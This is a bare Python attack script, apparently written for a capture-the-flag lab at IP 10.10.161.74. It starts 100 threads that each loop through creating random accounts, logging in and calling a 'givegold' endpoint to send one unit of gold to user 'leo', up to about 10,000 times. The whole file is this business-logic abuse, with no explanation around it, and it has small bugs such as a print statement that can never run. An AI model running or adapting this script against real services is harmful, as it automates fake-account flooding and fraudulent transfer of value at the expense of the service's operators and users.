
 
#!/bin/python3
import random
import threading
import string
import requests

def randonStrings(stringLength=8):
    letters = string.ascii_uppercase
    return ''.join(random.choice(letters) for i in range(stringLength))

c = 0

def coin():
    while True:
        randStr = 'USER-' + randonStrings(4)
        s = requests.Session()
        s.get('http://10.10.161.74/%27')
        data1 = {'username': '%s'%randStr ,'password' : '%s'%randStr ,'password2' : '%s'%randStr}
        rc1 = s.post('http://10.10.161.74/api/create',  data=data1, cookies=s.cookies.get_dict())
        data2 = {'username': '%s'%randStr ,'password' : '%s'%randStr}
        rc2 = s.post('http://10.10.161.74/api/login', cookies=s.cookies.get_dict(), data=data2, verify=False)
        data3 = {'user': 'leo' ,'amount' : 1} 
        rc3 = s.post('http://10.10.161.74/api/givegold', cookies=s.cookies.get_dict(), data=data3, verify=False)
        global c
        c += 1
        if c == 10001:
            break
            print(str(c) + " coins send successfully")

        print("Coin Number : " + str(c))

if __name__ == '__main__':
    for i in range(100):
        thread_Name = 't'+str(i)
        thread_Name = threading.Thread(target=coin)
        thread_Name.start()
